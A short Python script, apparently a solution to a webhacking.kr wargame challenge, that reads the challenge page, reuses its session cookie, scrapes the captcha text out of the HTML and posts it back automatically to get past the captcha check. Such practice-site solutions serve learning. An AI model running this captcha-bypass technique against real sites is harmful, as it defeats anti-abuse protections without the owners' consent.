import requests
# import hashlib
import time


URL = "https://webhacking.kr/challenge/code-4/"
SESSION_ID = "123"
cookies = {'PHPSESSID':SESSION_ID, 'st':str(time.time()) }

data = { "id": "admi", "cmt":"hello", "captcha":"" }
response = requests.get(URL, cookies=cookies)

my_cookieee = response.cookies.get('st')
cookies['st'] = my_cookieee

captcha_text = response.text.split("captcha_")[1][8:18]
print(captcha_text)
params ={}
    
data['captcha'] = captcha_text
print(data)
# cookies["st"] = str(time.time())
response = requests.post(URL,params=params,data=data, cookies=cookies)
print(response.text)

